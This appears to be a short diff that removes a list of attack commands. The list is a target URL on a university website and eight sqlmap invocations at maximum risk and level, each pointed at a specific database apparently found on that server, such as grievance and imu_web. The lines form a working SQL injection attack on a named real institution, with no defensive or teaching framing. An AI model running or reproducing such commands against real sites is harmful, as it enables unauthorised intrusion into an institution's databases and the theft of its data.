@@ -1,9 +1,0 @@
-http://www.imu.edu.in/index.php?prod_id=395
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D grievance
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D imu_web
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D imuweb
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D information_schema
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D marinco
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D mysql
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D performance_schema
-python ../sqlmap/sqlmap.py -u http://www.imu.edu.in/index.php?prod_id=395 --risk 3 --level 5 --batch --random-agent -D sys
